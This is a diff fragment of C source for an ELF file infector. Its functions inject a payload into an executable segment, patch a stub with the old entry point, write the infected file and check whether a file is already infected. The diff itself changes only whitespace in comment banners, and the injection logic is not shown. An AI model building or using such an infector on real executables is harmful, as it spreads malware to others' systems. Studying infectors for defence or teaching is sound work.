@@ -4,7 +4,7 @@
 #define MAGIC_PAYLOAD_SIZE 0xBBBBBBBBBBBBBBBBULL
 #define MAGIC_OLD_ENTRY    0xCCCCCCCCCCCCCCCCULL
 
-/* ============================================================
+/* ============================================================ 
    find_exec_segment
    ============================================================ */
 Elf64_Phdr *find_exec_segment(void *map, size_t mapsize)
@@ -25,7 +25,7 @@ Elf64_Phdr *find_exec_segment(void *map, size_t mapsize)
     return NULL;
 }
 
-/* ============================================================
+/* ============================================================ 
    align_size
    ============================================================ */
 size_t align_size(size_t size, size_t align)
@@ -33,7 +33,7 @@ size_t align_size(size_t size, size_t align)
     return (align == 0) ? size : (size + align - 1) & ~(align - 1);
 }
 
-/* ============================================================
+/* ============================================================ 
    patch_stub — nouvelle version compatible avec le stub actuel
    Patch les variables globales g_payload_addr / size / old_entry
    ============================================================ */
@@ -61,7 +61,7 @@ void patch_stub(unsigned char *stub, size_t stub_size, uint64_t payload_rel_off,
 
 
 
-/* ============================================================
+/* ============================================================ 
    inject_payload
    ============================================================ */
 int inject_payload(void *map, size_t mapsize, ElfInfo *info,
@@ -127,7 +127,7 @@ int inject_payload(void *map, size_t mapsize, ElfInfo *info,
     return 0;
 }
 
-/* ============================================================
+/* ============================================================ 
    write_infected_file
    ============================================================ */
 int write_infected_file(const char *path, void *map, size_t size)
@@ -140,7 +140,7 @@ int write_infected_file(const char *path, void *map, size_t size)
     return close(fd);
 }
 
-/* ============================================================
+/* ============================================================ 
    already_infected (optionnel)
    ============================================================ */
 int already_infected(void *map, ElfInfo *info)
